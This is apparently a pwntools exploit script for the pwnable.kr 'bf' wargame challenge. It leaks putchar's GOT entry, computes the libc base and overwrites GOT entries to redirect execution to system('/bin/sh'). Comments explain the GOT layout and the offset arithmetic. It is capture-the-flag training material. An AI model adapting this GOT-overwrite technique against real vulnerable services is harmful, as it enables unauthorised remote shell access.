from pwn import *
from pwnlib.util.packing import p32
# context(log_level="debug")

p = remote('pwnable.kr', 9001)
# p = process("./bf")
p.recvuntil("type some brainfuck instructions except [ ]")

# trigger putchar got lookup '.'
# read putchar got 70<4.>
# overwrite puchar 4<4,>
# modify fgets 32+4<4,>
# modify memset 24>4,>
# trigger fake putchar

p.sendline('.'+'<'*0x70+'.>'*4+'<'*4+',>'*4+'<'*36+',>'*4+'>'*24+',>'*4+'.')
p.recv(1)
p.recv(1)
putchar = p.recv(4)

libc = ELF('/home/koi/dumpster/pwncache/bf_libc.so')
base = int.from_bytes(putchar, "little") - libc.symbols['putchar']
entry = 0x080484e0
system = base + libc.symbols['system']
gets = base + libc.symbols['gets']

p.send(p32(entry)+p32(system)+p32(gets))
p.sendline('/bin/sh\x00')
p.interactive()
p.close()

# pwn
# 0x0804a000  got table
# 0x804a0a0 obj.tape
# 0x080484e0 entry

# reloc for :
# [Imports]
# nth vaddr      bind   type   lib name
# ―――――――――――――――――――――――――――――――――――――
# 1   0x08048440 GLOBAL FUNC       getchar
# 2   0x08048450 GLOBAL FUNC       fgets
# 3   0x08048460 GLOBAL FUNC       __stack_chk_fail
# 4   0x08048470 GLOBAL FUNC       puts
# 5   0x08048480 WEAK   NOTYPE     __gmon_start__
# 6   0x08048490 GLOBAL FUNC       strlen
# 7   0x080484a0 GLOBAL FUNC       __libc_start_main
# 8   0x080484b0 GLOBAL FUNC       setvbuf
# 9   0x080484c0 GLOBAL FUNC       memset
# 10  0x080484d0 GLOBAL FUNC       putchar

# eg: memset()

# main
  # 0x080484c0
    # access 0x0804a02c
    # jmp to 0x080484c6 (next inst because no got is loaded)
      # jmp to sym..plt
        # ...

    # now in 0x0804a02c there are the address of memset

# GOT for :
# fgets 0x804a010
# memset 0x0804a02c
# putchar 0x804a030

# Move the ptr to the got entry for putchar. Use this offset to calculate other functions.
# The GOT table is not randomized as PIC is false.
# eg: we have the provided bf_libc.so.
# offset.system = offset.putchar - offset.libc.putchar + offset.libc.system
